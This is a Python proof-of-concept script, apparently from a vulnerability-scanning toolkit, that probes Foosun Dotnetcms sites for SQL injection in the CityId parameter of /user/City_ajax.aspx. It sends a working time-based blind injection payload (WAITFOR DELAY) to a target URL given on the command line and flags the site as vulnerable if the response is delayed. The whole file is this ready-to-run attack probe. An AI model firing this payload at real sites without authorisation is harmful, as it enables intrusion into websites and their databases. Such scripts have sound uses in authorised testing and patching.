#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dotnetcms(风讯cms)SQL注入漏洞
referer: https://silic.wiki/0day:%E9%A3%8E%E8%BF%85_dotnetcms_2.0-1.0_sql_injection
author: Lucifer
description: 文件City_ajax.aspx中,参数CityId存在SQL注入。
'''
import sys
import time
import requests
import warnings
sys.path.append('../../') 
from color import *

class foosun_City_ajax_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/user/City_ajax.aspx?CityId=1%27WAiTFoR%20DeLAy%20%270:0:6%27--"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                printGreen("[+]Success:存在Dotnetcms(风讯cms)SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在foosun_City_ajax_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = foosun_City_ajax_sqli(sys.argv[1])
    testVuln.run()